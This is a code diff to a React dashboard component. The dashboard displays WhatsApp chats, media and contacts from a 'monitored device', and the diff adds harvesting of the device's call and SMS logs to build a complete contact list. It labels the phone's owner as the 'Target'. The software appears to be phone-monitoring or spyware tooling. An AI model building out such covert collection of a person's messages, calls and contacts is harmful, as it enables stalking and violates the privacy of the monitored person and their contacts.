@@ -2,7 +2,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { apiClient } from "../api/client";
 import { devicesApi } from "../api/devices";
 import { downloadFileViaRelay } from "../api/fileDownload";
-import type { WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
+import type { WhatsAppChatSummary, WhatsAppMessage, CallLogEntry, SmsLogEntry } from "../api/types";
 
 // ============================================================================
 // TYPES & DATA MODELS
@@ -75,6 +75,7 @@ export interface UnifiedChatSummary {
   lastIsOutgoing: boolean;
   totalMessages: number;
   source: "whatsapp";
+  isContactOnly?: boolean;
 }
 
 export interface UnifiedChatMessage {
@@ -224,18 +225,41 @@ function MessengerLogo({ className = "w-5 h-5" }: { className?: string }) {
   );
 }
 
-export function isPlaceholderOrNumber(text: string | null | undefined): boolean {
+export function isContactSyncPlaceholder(text: string | null | undefined): boolean {
   if (!text) return true;
   const t = text.trim();
   if (!t) return true;
   if (t.includes("@s.whatsapp.net") || t.includes("@g.us")) return true;
-  if (["WhatsApp Contact", "Recent contact", "Recent conversation"].includes(t)) return true;
-  if (/^\+?[0-9\s-]{7,25}$/.test(t)) return true;
+  if (["WhatsApp Contact", "Recent contact", "Recent conversation", "Tap to view conversation"].includes(t)) return true;
   if (/^Message \+?[0-9\s-]+$/i.test(t)) return true;
-  if (/^[0-9*#]+$/.test(t)) return true;
-  if (/^(UPIACT|HDFCUPI|SBIUPI|JP7 |PAYTMUPI)/i.test(t)) return true;
   return false;
 }
+
+export function isPhoneNumberString(text: string | null | undefined): boolean {
+  if (!text) return false;
+  const t = text.trim();
+  return /^\+?[0-9\s\-()]{7,25}$/.test(t);
+}
+
+export function isAutomatedShortCode(str: string): boolean {
+  const s = str.toUpperCase();
+  return (
+    s.includes("BNK") ||
+    s.includes("BANK") ||
+    s.includes("AIRTEL") ||
+    s.includes("JIO") ||
+    s.includes("OTP") ||
+    s.includes("PROMO") ||
+    s.includes("LOAN") ||
+    /^[A-Z]{2}-[A-Z0-9]+-[A-Z]$/.test(s)
+  );
+}
+
+export function isPlaceholderOrNumber(text: string | null | undefined): boolean {
+  return isContactSyncPlaceholder(text) || isPhoneNumberString(text);
+}
+
+export type ChatCategoryTab = "all" | "chats" | "contacts" | "channels";
 
 // ============================================================================
 // MAIN APPSCARD COMPONENT
@@ -245,7 +269,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [selectedApp, setSelectedApp] = useState<AvailableAppId>("whatsapp");
   const [activeView, setActiveView] = useState<"chats" | "files">("chats");
   const [timeFilter, setTimeFilter] = useState<"2days" | "all">("all");
-  const [chatCategory, setChatCategory] = useState<"chats" | "channels">("chats");
+  const [chatCategory, setChatCategory] = useState<ChatCategoryTab>("all");
   const [dashboardLoginTime] = useState<Date>(() => new Date());
 
   // Real Data States
@@ -269,7 +293,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [downloadingFile, setDownloadingFile] = useState<string | null>(null);
 
   // --------------------------------------------------------------------------
-  // 1. DATA LOADER (STRICTLY REAL WHATSAPP TEXT MESSAGES ONLY)
+  // 1. DATA LOADER: WHATSAPP CHATS, CONTACTS & REAL MESSAGES
   // --------------------------------------------------------------------------
   const loadDeviceChatData = async (isManual = false) => {
     if (isManual) setLoading(true);
@@ -280,7 +304,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         });
       }
 
-      const [waData, allMsgs] = await Promise.all([
+      const [waData, allMsgs, callsData, smsData] = await Promise.all([
         devicesApi.whatsAppChats(deviceId).catch((err) => {
           console.warn("WhatsApp chats fetch error:", err);
           return [] as WhatsAppChatSummary[];
@@ -289,13 +313,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           console.warn("WhatsApp all messages fetch error:", err);
           return [] as WhatsAppMessage[];
         }),
+        devicesApi.callLog(deviceId).catch(() => [] as CallLogEntry[]),
+        devicesApi.smsLog(deviceId).catch(() => [] as SmsLogEntry[]),
       ]);
 
       // Build real message index by chat name
       const latestRealByChat = new Map<string, WhatsAppMessage>();
       const countRealByChat = new Map<string, number>();
       for (const m of (allMsgs || [])) {
-        if (isPlaceholderOrNumber(m.message_text) && !m.media_path) continue;
+        if (!m.chat_name || !m.chat_name.trim()) continue;
         const key = m.chat_name.trim().toLowerCase();
         countRealByChat.set(key, (countRealByChat.get(key) || 0) + 1);
         const existing = latestRealByChat.get(key);
@@ -307,39 +333,71 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       const cleanedChats: WhatsAppChatSummary[] = [];
       const seenChats = new Set<string>();
 
+      // 1. Process WhatsApp chats & contacts from device
       for (const c of (waData || [])) {
+        if (!c.chat_name || !c.chat_name.trim()) continue;
         if (["WhatsApp Audio", "WhatsApp Photos", "WhatsApp Documents", "WhatsApp Video", "WhatsApp Media"].includes(c.chat_name)) continue;
         const key = c.chat_name.trim().toLowerCase();
         const realMsg = latestRealByChat.get(key);
-        const hasRealLastMsg = !isPlaceholderOrNumber(c.last_message);
 
         const cTime = c.last_message_at ? new Date(c.last_message_at).getTime() : 0;
         const rTime = realMsg?.message_time ? new Date(realMsg.message_time).getTime() : 0;
-        const latestTime = rTime > cTime ? realMsg!.message_time : c.last_message_at;
-        const latestText = (hasRealLastMsg && cTime >= rTime) ? c.last_message : (realMsg?.message_text || c.last_message);
-        const latestOutgoing = (hasRealLastMsg && cTime >= rTime) ? Boolean(c.last_is_outgoing) : (realMsg ? Boolean(realMsg.is_outgoing) : Boolean(c.last_is_outgoing));
+        const latestTime = rTime > cTime ? realMsg!.message_time : (c.last_message_at || new Date().toISOString());
+        const latestText = rTime > cTime ? (realMsg?.message_text || c.last_message) : (c.last_message || realMsg?.message_text || null);
+        const latestOutgoing = rTime > cTime ? Boolean(realMsg?.is_outgoing) : Boolean(c.last_is_outgoing);
 
-        if (latestText && !isPlaceholderOrNumber(latestText)) {
+        cleanedChats.push({
+          chat_name: c.chat_name.trim(),
+          total_messages: Math.max(countRealByChat.get(key) || 0, c.total_messages || 1),
+          last_message_at: latestTime,
+          last_message: latestText,
+          last_is_outgoing: latestOutgoing,
+        });
+        seenChats.add(key);
+      }
+
+      // 2. Also ensure any chat present in allMsgs that wasn't in waData is included
+      for (const [key, realMsg] of latestRealByChat.entries()) {
+        if (!seenChats.has(key)) {
           cleanedChats.push({
-            chat_name: c.chat_name,
-            total_messages: Math.max(countRealByChat.get(key) || 0, c.total_messages || 1),
-            last_message_at: latestTime,
-            last_message: latestText,
-            last_is_outgoing: latestOutgoing,
+            chat_name: realMsg.chat_name.trim(),
+            total_messages: countRealByChat.get(key) || 1,
+            last_message_at: realMsg.message_time,
+            last_message: realMsg.message_text,
+            last_is_outgoing: Boolean(realMsg.is_outgoing),
           });
           seenChats.add(key);
         }
       }
 
-      // Also ensure any chat present in allMsgs that wasn't in waData is included
-      for (const [key, realMsg] of latestRealByChat.entries()) {
+      // 3. Harvest human contacts from call logs & SMS logs so the complete phone address book is included
+      for (const call of (callsData || [])) {
+        const name = (call.contact_name?.trim() || call.counterparty?.trim());
+        if (!name || isAutomatedShortCode(name)) continue;
+        const key = name.toLowerCase();
         if (!seenChats.has(key)) {
           cleanedChats.push({
-            chat_name: realMsg.chat_name,
-            total_messages: countRealByChat.get(key) || 1,
-            last_message_at: realMsg.message_time,
-            last_message: realMsg.message_text,
-            last_is_outgoing: Boolean(realMsg.is_outgoing),
+            chat_name: name,
+            total_messages: 1,
+            last_message_at: call.called_at,
+            last_message: call.counterparty && call.counterparty !== name ? call.counterparty : "WhatsApp Contact",
+            last_is_outgoing: call.direction === "outgoing",
+          });
+          seenChats.add(key);
+        }
+      }
+
+      for (const sms of (smsData || [])) {
+        const name = (sms.contact_name?.trim() || sms.counterparty?.trim());
+        if (!name || isAutomatedShortCode(name)) continue;
+        const key = name.toLowerCase();
+        if (!seenChats.has(key)) {
+          cleanedChats.push({
+            chat_name: name,
+            total_messages: 1,
+            last_message_at: sms.message_at,
+            last_message: sms.counterparty && sms.counterparty !== name ? sms.counterparty : "WhatsApp Contact",
+            last_is_outgoing: sms.direction === "outgoing",
           });
           seenChats.add(key);
         }
@@ -409,44 +467,81 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const whatsappChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
     if (!whatsappChats || whatsappChats.length === 0) return [];
     return whatsappChats.map((c) => {
+      const isChannel = isWhatsAppChannel({ chatName: c.chat_name, subtitle: "", lastMessage: c.last_message } as any);
+      const isPlaceholder = isContactSyncPlaceholder(c.last_message);
+      const isPhone = isPhoneNumberString(c.last_message);
+      const isContact = !isChannel && (c.total_messages <= 1 && (isPlaceholder || isPhone));
+
+      let subtitle = "WhatsApp Contact";
+      if (isChannel) {
+        subtitle = "WhatsApp Channel / Broadcast";
+      } else if (isPhone) {
+        subtitle = c.last_message!;
+      } else if (isPhoneNumberString(c.chat_name)) {
+        subtitle = "WhatsApp Contact";
+      }
+
+      let displayLastMessage = c.last_message;
+      if (!displayLastMessage || isPlaceholder) {
+        displayLastMessage = isPhone ? c.last_message : "Registered WhatsApp Contact";
+      }
+
       const summaryObj: UnifiedChatSummary = {
         id: `wa-${c.chat_name}`,
         chatName: c.chat_name,
-        subtitle: "WhatsApp Contact",
-        lastMessage: c.last_message || "(Media message)",
+        subtitle,
+        lastMessage: displayLastMessage,
         lastMessageAt: c.last_message_at,
         lastIsOutgoing: c.last_is_outgoing,
         totalMessages: c.total_messages,
         source: "whatsapp",
+        isContactOnly: isContact,
       };
-      if (isWhatsAppChannel(summaryObj)) {
-        summaryObj.subtitle = "WhatsApp Channel / Broadcast";
-      }
       return summaryObj;
     });
   }, [whatsappChats]);
 
-  // Separate Chats and WhatsApp Channels so they are NEVER collapsed together
-  const { personalChats, channelChats } = useMemo(() => {
-    const personal: UnifiedChatSummary[] = [];
+  // Separate into All Chats/Contacts, Active Chats, Contacts list, and Channels
+  const { allPersonalAndContacts, activeChats, allContacts, channelChats } = useMemo(() => {
+    const allPersonal: UnifiedChatSummary[] = [];
+    const active: UnifiedChatSummary[] = [];
+    const contacts: UnifiedChatSummary[] = [];
     const channels: UnifiedChatSummary[] = [];
+
     for (const c of whatsappChatSummaries) {
       if (isWhatsAppChannel(c)) {
         channels.push(c);
       } else {
-        personal.push(c);
+        allPersonal.push(c);
+        if (c.isContactOnly) {
+          contacts.push(c);
+        } else {
+          active.push(c);
+        }
       }
     }
-    return { personalChats: personal, channelChats: channels };
+
+    // Sort contacts alphabetically A-Z for easy directory browsing
+    const sortedContacts = [...allPersonal].sort((a, b) => a.chatName.localeCompare(b.chatName));
+
+    return {
+      allPersonalAndContacts: allPersonal,
+      activeChats: active,
+      allContacts: sortedContacts,
+      channelChats: channels,
+    };
   }, [whatsappChatSummaries]);
 
-  // Active Chats for the currently selected category tab (Chats vs Channels)
+  // Active Chats for the currently selected category tab (all, chats, contacts, channels)
   const activeCategoryChats = useMemo<UnifiedChatSummary[]>(() => {
     if (selectedApp === "whatsapp") {
-      return chatCategory === "chats" ? personalChats : channelChats;
+      if (chatCategory === "all") return allPersonalAndContacts;
+      if (chatCategory === "chats") return activeChats;
+      if (chatCategory === "contacts") return allContacts;
+      if (chatCategory === "channels") return channelChats;
     }
     return [];
-  }, [selectedApp, chatCategory, personalChats, channelChats]);
+  }, [selectedApp, chatCategory, allPersonalAndContacts, activeChats, allContacts, channelChats]);
 
   // Filtered Chats by search within the currently active category
   const displayedChats = useMemo<UnifiedChatSummary[]>(() => {
@@ -496,8 +591,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         .whatsAppMessages(deviceId, currentChatName)
         .then((msgs: WhatsAppMessage[]) => {
           if (!isMounted) return;
+          // Filter out only synthetic placeholder markers so real messages (even numbers/OTPs) are kept
           const list = (msgs || []).filter(
-            (m) => !isPlaceholderOrNumber(m.message_text) || Boolean(m.media_path)
+            (m) =>
+              (!isContactSyncPlaceholder(m.message_text) && !isPhoneNumberString(m.message_text)) ||
+              Boolean(m.media_path)
           );
           const filtered = timeFilter === "all" ? list : list.filter((m) => isWithinLast2Days(m.message_time, dashboardLoginTime));
           const effective = filtered.length > 0 ? filtered : list;
@@ -531,7 +629,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           if (
             unified.length === 0 &&
             currentChat?.lastMessage &&
-            !isPlaceholderOrNumber(currentChat.lastMessage)
+            !isContactSyncPlaceholder(currentChat.lastMessage) &&
+            !isPhoneNumberString(currentChat.lastMessage) &&
+            currentChat.lastMessage !== "Registered WhatsApp Contact"
           ) {
             const rawLast = currentChat.lastMessage;
             const isTargetSent = Boolean(currentChat.lastIsOutgoing) ||
@@ -759,7 +859,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                 }`}
               >
                 <span>💬</span>
-                <span>Chats</span>
+                <span>Chats & Contacts</span>
               </button>
               <button
                 type="button"
@@ -806,7 +906,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           <div className="space-y-1.5 flex-1 min-h-0 overflow-y-auto">
             {SUPPORTED_APPS.map((app) => {
               const isSelected = selectedApp === app.id;
-              const count = app.id === "whatsapp" ? whatsappChatSummaries.length : 0;
+              const count = app.id === "whatsapp" ? allPersonalAndContacts.length : 0;
 
               return (
                 <button
@@ -858,7 +958,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       </span>
                       {app.isSupported && (
                         <span className="text-[10px] text-gray-400 font-medium">
-                          {count} {count === 1 ? "chat" : "chats"}
+                          {count} {count === 1 ? "contact & chat" : "contacts & chats"}
                         </span>
                       )}
                     </div>
@@ -871,10 +971,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1 shrink-0">
             <p className="font-semibold flex items-center gap-1">
               <span>📱</span>
-              <span>Real WhatsApp Chats</span>
+              <span>WhatsApp Chats & Contacts</span>
             </p>
             <p className="text-[10px] text-emerald-700 leading-tight">
-              Shows WhatsApp conversations and media stored on the monitored device.
+              Shows all WhatsApp contacts, active conversations, and media storage on this device.
             </p>
           </div>
         </div>
@@ -922,7 +1022,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           activeView === "chats" && (
             <>
               {/* ----------------------------------------------------------- */}
-              {/* COLUMN 2: COMPLETE CHATLIST & CHANNELS FROM MOBILE PHONE    */}
+              {/* COLUMN 2: COMPLETE CHATLIST & CONTACTS FROM MOBILE PHONE    */}
               {/* ----------------------------------------------------------- */}
               <div className="w-full md:w-80 lg:w-96 shrink-0 border-r border-gray-100 flex flex-col bg-white h-full min-h-0 overflow-hidden">
                 {/* Search Bar */}
@@ -930,7 +1030,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   <div className="relative">
                     <input
                       type="text"
-                      placeholder={chatCategory === "chats" ? "Search WhatsApp chats..." : "Search WhatsApp channels..."}
+                      placeholder={
+                        chatCategory === "contacts"
+                          ? "Search WhatsApp contacts..."
+                          : chatCategory === "chats"
+                          ? "Search active chats..."
+                          : chatCategory === "channels"
+                          ? "Search channels..."
+                          : "Search contacts & chats..."
+                      }
                       value={chatSearch}
                       onChange={(e) => setChatSearch(e.target.value)}
                       className="w-full text-xs pl-8 pr-7 py-2 bg-white border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 transition"
@@ -947,40 +1055,80 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     )}
                   </div>
 
-                  {/* Category Selector Below Search Bar: Separate Chats and WhatsApp Channels */}
-                  <div className="bg-gray-200/70 p-1 rounded-lg flex text-xs font-semibold gap-1">
+                  {/* Category Selector Below Search Bar: All | Chats | Contacts | Channels */}
+                  <div className="bg-gray-200/70 p-1 rounded-lg grid grid-cols-4 text-[11px] font-semibold gap-1">
+                    <button
+                      type="button"
+                      onClick={() => setChatCategory("all")}
+                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1 ${
+                        chatCategory === "all"
+                          ? "bg-white text-emerald-900 shadow-xs font-bold"
+                          : "text-gray-600 hover:text-gray-900"
+                      }`}
+                    >
+                      <span className="truncate">All</span>
+                      <span
+                        className={`text-[9px] px-1 py-0.2 rounded-full font-bold ${
+                          chatCategory === "all"
+                            ? "bg-emerald-100 text-emerald-800"
+                            : "bg-gray-300/80 text-gray-700"
+                        }`}
+                      >
+                        {allPersonalAndContacts.length}
+                      </span>
+                    </button>
                     <button
                       type="button"
                       onClick={() => setChatCategory("chats")}
-                      className={`flex-1 py-1.5 px-3 rounded-md transition flex items-center justify-center gap-1.5 ${
+                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1 ${
                         chatCategory === "chats"
                           ? "bg-white text-emerald-900 shadow-xs font-bold"
                           : "text-gray-600 hover:text-gray-900"
                       }`}
                     >
-                      <span>💬 Chats</span>
+                      <span className="truncate">Chats</span>
                       <span
-                        className={`text-[10px] px-1.5 py-0.2 rounded-full font-bold ${
+                        className={`text-[9px] px-1 py-0.2 rounded-full font-bold ${
                           chatCategory === "chats"
                             ? "bg-emerald-100 text-emerald-800"
                             : "bg-gray-300/80 text-gray-700"
                         }`}
                       >
-                        {personalChats.length}
+                        {activeChats.length}
+                      </span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setChatCategory("contacts")}
+                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1 ${
+                        chatCategory === "contacts"
+                          ? "bg-white text-sky-900 shadow-xs font-bold"
+                          : "text-gray-600 hover:text-gray-900"
+                      }`}
+                    >
+                      <span className="truncate">Contacts</span>
+                      <span
+                        className={`text-[9px] px-1 py-0.2 rounded-full font-bold ${
+                          chatCategory === "contacts"
+                            ? "bg-sky-100 text-sky-800"
+                            : "bg-gray-300/80 text-gray-700"
+                        }`}
+                      >
+                        {allContacts.length}
                       </span>
                     </button>
                     <button
                       type="button"
                       onClick={() => setChatCategory("channels")}
-                      className={`flex-1 py-1.5 px-3 rounded-md transition flex items-center justify-center gap-1.5 ${
+                      className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1 ${
                         chatCategory === "channels"
                           ? "bg-white text-purple-900 shadow-xs font-bold"
                           : "text-gray-600 hover:text-gray-900"
                       }`}
                     >
-                      <span>📢 Channels</span>
+                      <span className="truncate">Channels</span>
                       <span
-                        className={`text-[10px] px-1.5 py-0.2 rounded-full font-bold ${
+                        className={`text-[9px] px-1 py-0.2 rounded-full font-bold ${
                           chatCategory === "channels"
                             ? "bg-purple-100 text-purple-800"
                             : "bg-gray-300/80 text-gray-700"
@@ -993,7 +1141,19 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
                   <div className="flex items-center justify-between text-[10px] text-gray-400 px-1 pt-0.5">
                     <span>
-                      {displayedChats.length} {displayedChats.length === 1 ? (chatCategory === "chats" ? "chat" : "channel") : (chatCategory === "chats" ? "chats" : "channels")} on device
+                      {displayedChats.length}{" "}
+                      {displayedChats.length === 1
+                        ? chatCategory === "contacts"
+                          ? "contact"
+                          : chatCategory === "channels"
+                          ? "channel"
+                          : "item"
+                        : chatCategory === "contacts"
+                        ? "contacts"
+                        : chatCategory === "channels"
+                        ? "channels"
+                        : "items"}{" "}
+                      on device
                     </span>
                     <span className="font-semibold text-emerald-600 flex items-center gap-1">
                       <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
@@ -1002,25 +1162,41 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   </div>
                 </div>
 
-                {/* Chats & Channels List */}
+                {/* Chats & Contacts List */}
                 <div className="flex-1 min-h-0 overflow-y-auto divide-y divide-gray-100 overscroll-contain">
                   {loading && activeCategoryChats.length === 0 ? (
                     <div className="p-8 text-center text-xs text-gray-400 space-y-1">
                       <span className="animate-spin text-lg block">↻</span>
-                      <p>Loading real {chatCategory === "chats" ? "chats" : "channels"} from device...</p>
+                      <p>
+                        Loading real{" "}
+                        {chatCategory === "contacts"
+                          ? "contacts"
+                          : chatCategory === "channels"
+                          ? "channels"
+                          : "chats & contacts"}{" "}
+                        from device...
+                      </p>
                     </div>
                   ) : displayedChats.length === 0 ? (
                     <div className="p-8 text-center text-xs text-gray-400 space-y-2">
-                      <span className="text-2xl block">{chatCategory === "chats" ? "💬" : "📢"}</span>
+                      <span className="text-2xl block">
+                        {chatCategory === "contacts" ? "👥" : chatCategory === "channels" ? "📢" : "💬"}
+                      </span>
                       <p className="font-semibold text-gray-700">
-                        {chatCategory === "chats" ? "No chats found on device" : "No WhatsApp channels found"}
+                        {chatCategory === "contacts"
+                          ? "No WhatsApp contacts found"
+                          : chatCategory === "channels"
+                          ? "No WhatsApp channels found"
+                          : "No chats or contacts found"}
                       </p>
                       <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
-                        {chatCategory === "chats"
-                          ? "No personal WhatsApp chats have been saved from this phone yet. Open WhatsApp on the device or wait for incoming messages to sync."
-                          : "WhatsApp channels, community updates, and broadcasts on the device appear here separately from personal chats."}
+                        {chatCategory === "contacts"
+                          ? "Contacts from WhatsApp and device address book will appear here."
+                          : chatCategory === "channels"
+                          ? "WhatsApp channels, community updates, and broadcasts on the device appear here."
+                          : "WhatsApp contacts and conversation messages saved from this phone appear here."}
                       </p>
-                      {chatCategory === "chats" && (
+                      {chatCategory !== "channels" && (
                         <button
                           type="button"
                           onClick={() => setActiveView("files")}
@@ -1034,6 +1210,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     displayedChats.map((c) => {
                       const isSelected = selectedChatId === c.id;
                       const isChannelItem = isWhatsAppChannel(c);
+                      const isContactItem = Boolean(c.isContactOnly);
                       return (
                         <div
                           key={c.id}
@@ -1049,18 +1226,20 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                             className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white relative ${
                               isChannelItem
                                 ? "bg-gradient-to-br from-purple-500 to-indigo-600"
+                                : isContactItem
+                                ? "bg-gradient-to-br from-sky-500 to-teal-600"
                                 : "bg-gradient-to-br from-emerald-500 to-teal-600"
                             }`}
                           >
-                            {isChannelItem ? "📢" : c.chatName.charAt(0).toUpperCase()}
+                            {isChannelItem ? "📢" : isContactItem ? "👤" : c.chatName.charAt(0).toUpperCase()}
                             <span
                               className={`absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full border-2 border-white ${
-                                isChannelItem ? "bg-indigo-400" : "bg-emerald-400"
+                                isChannelItem ? "bg-indigo-400" : isContactItem ? "bg-sky-400" : "bg-emerald-400"
                               }`}
                             />
                           </div>
 
-                          {/* Chat / Channel Information */}
+                          {/* Chat / Channel / Contact Information */}
                           <div className="flex-1 min-w-0">
                             <div className="flex items-center justify-between gap-1 mb-0.5">
                               <h4 className="text-xs font-bold text-gray-900 truncate">
@@ -1071,33 +1250,43 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               </span>
                             </div>
 
-                            {c.subtitle && (
-                              <p className="text-[10px] text-gray-400 font-mono truncate mb-0.5">
+                            {c.subtitle && c.subtitle !== "WhatsApp Contact" && (
+                              <p className="text-[10px] text-gray-500 font-mono truncate mb-0.5">
                                 {c.subtitle}
                               </p>
                             )}
 
-                            {/* Two-line preview with verified Sent vs Recv indicator */}
+                            {/* Two-line preview */}
                             <p
                               className="text-[11px] text-gray-600 line-clamp-2 leading-snug flex items-start gap-1"
                               title={c.lastMessage || ""}
                             >
-                              {c.lastIsOutgoing ? (
+                              {!isContactItem && c.lastIsOutgoing ? (
                                 <span className="text-emerald-600 font-bold text-[10px] shrink-0" title="Sent by Target">
                                   ↗ Sent:
                                 </span>
-                              ) : (
+                              ) : !isContactItem && c.lastMessage && c.lastMessage !== "Registered WhatsApp Contact" ? (
                                 <span className="text-sky-600 font-bold text-[10px] shrink-0" title="Received from Contact">
                                   ↙ Recv:
                                 </span>
-                              )}
-                              <span className="truncate">{c.lastMessage || "(No text)"}</span>
+                              ) : null}
+                              <span className="truncate">
+                                {isContactItem
+                                  ? (c.subtitle && c.subtitle !== "WhatsApp Contact" ? c.subtitle : "WhatsApp Contact")
+                                  : (c.lastMessage || "(No messages yet)")}
+                              </span>
                             </p>
 
                             <div className="mt-1 flex items-center gap-1.5">
-                              <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
-                                {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
-                              </span>
+                              {isContactItem ? (
+                                <span className="text-[9px] font-semibold bg-sky-50 text-sky-700 border border-sky-200 px-1.5 py-0.2 rounded">
+                                  👤 Contact
+                                </span>
+                              ) : (
+                                <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
+                                  {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
+                                </span>
+                              )}
                               <span
                                 className={`text-[9px] font-semibold uppercase px-1.5 py-0.2 rounded border ${
                                   isChannelItem
@@ -1127,10 +1316,18 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       <div className="flex items-center gap-3 min-w-0">
                         <div
                           className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
-                            isWhatsAppChannel(selectedChatSummary) ? "bg-purple-600" : "bg-emerald-600"
+                            isWhatsAppChannel(selectedChatSummary)
+                              ? "bg-purple-600"
+                              : selectedChatSummary.isContactOnly
+                              ? "bg-sky-600"
+                              : "bg-emerald-600"
                           }`}
                         >
-                          {isWhatsAppChannel(selectedChatSummary) ? "📢" : selectedChatSummary.chatName.charAt(0).toUpperCase()}
+                          {isWhatsAppChannel(selectedChatSummary)
+                            ? "📢"
+                            : selectedChatSummary.isContactOnly
+                            ? "👤"
+                            : selectedChatSummary.chatName.charAt(0).toUpperCase()}
                         </div>
                         <div className="min-w-0">
                           <h3 className="text-xs font-bold text-gray-900 truncate">
@@ -1139,7 +1336,8 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           <p className="text-[10px] text-gray-400 flex items-center gap-1">
                             <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block" />
                             <span className="truncate">
-                              {selectedChatSummary.subtitle || "WhatsApp Contact"} • Conversation Activity
+                              {selectedChatSummary.subtitle || "WhatsApp Contact"} •{" "}
+                              {selectedChatSummary.isContactOnly ? "Contact Directory" : "Conversation Activity"}
                             </span>
                           </p>
                         </div>
@@ -1208,27 +1406,79 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           Loading messages...
                         </div>
                       ) : activeThreadMessages.length === 0 ? (
-                        <div className="text-center py-14 text-xs text-gray-400 space-y-2">
-                          <span className="text-3xl block">💬</span>
-                          <p className="font-semibold text-gray-700">
-                            {selectedChatSummary.totalMessages > 0 && timeFilter === "2days"
-                              ? "No messages exchanged in the last 2 days"
-                              : "No messages recorded yet for this contact"}
-                          </p>
-                          <p className="text-[11px] text-gray-400 max-w-sm mx-auto">
-                            {selectedChatSummary.totalMessages > 0
-                              ? "Older messages exist outside the 2-day window."
-                              : "Incoming notifications and conversation messages will sync here automatically when received on the device."}
-                          </p>
-                          {selectedChatSummary.totalMessages > 0 && timeFilter === "2days" && (
+                        <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
+                          <div className="w-full max-w-sm bg-white rounded-2xl shadow-sm border border-gray-200/80 p-6 space-y-4">
+                            {/* Avatar */}
+                            <div className="w-16 h-16 mx-auto rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 flex items-center justify-center text-white text-2xl font-bold shadow-md">
+                              {selectedChatSummary.chatName.charAt(0).toUpperCase()}
+                            </div>
+
+                            {/* Name & Phone Info */}
+                            <div>
+                              <h3 className="text-base font-bold text-gray-900 truncate">
+                                {selectedChatSummary.chatName}
+                              </h3>
+                              {selectedChatSummary.subtitle && selectedChatSummary.subtitle !== "WhatsApp Contact" && (
+                                <p className="text-xs font-mono text-gray-500 mt-0.5">
+                                  {selectedChatSummary.subtitle}
+                                </p>
+                              )}
+                              <span className="inline-flex items-center gap-1.5 mt-2 px-2.5 py-0.5 rounded-full text-[11px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200">
+                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
+                                WhatsApp Synced Contact
+                              </span>
+                            </div>
+
+                            <div className="border-t border-gray-100 pt-3 text-left space-y-2 text-xs">
+                              <div className="flex items-center justify-between text-gray-500">
+                                <span>Contact Name</span>
+                                <strong className="text-gray-800 truncate max-w-[180px]">
+                                  {selectedChatSummary.chatName}
+                                </strong>
+                              </div>
+                              {selectedChatSummary.subtitle && selectedChatSummary.subtitle !== "WhatsApp Contact" && (
+                                <div className="flex items-center justify-between text-gray-500">
+                                  <span>Phone / ID</span>
+                                  <strong className="text-gray-800 font-mono">
+                                    {selectedChatSummary.subtitle}
+                                  </strong>
+                                </div>
+                              )}
+                              <div className="flex items-center justify-between text-gray-500">
+                                <span>Status</span>
+                                <span className="text-emerald-600 font-medium">In WhatsApp Address Book</span>
+                              </div>
+                              <div className="flex items-center justify-between text-gray-500">
+                                <span>Last Activity</span>
+                                <span className="text-gray-700 font-medium">
+                                  {formatMessageDateTime(selectedChatSummary.lastMessageAt || "")}
+                                </span>
+                              </div>
+                            </div>
+
+                            <div className="bg-emerald-50/50 rounded-xl p-3 text-[11px] text-emerald-800/80 leading-relaxed text-left border border-emerald-100/60">
+                              💡 This contact is synced from the device's WhatsApp contact directory. When new messages are sent or received, they will appear live in this thread.
+                            </div>
+
                             <button
                               type="button"
-                              onClick={() => setTimeFilter("all")}
-                              className="text-emerald-700 font-semibold underline text-[11px]"
+                              onClick={() => loadDeviceChatData(true)}
+                              className="w-full py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg text-xs font-semibold transition flex items-center justify-center gap-1.5 shadow-xs"
                             >
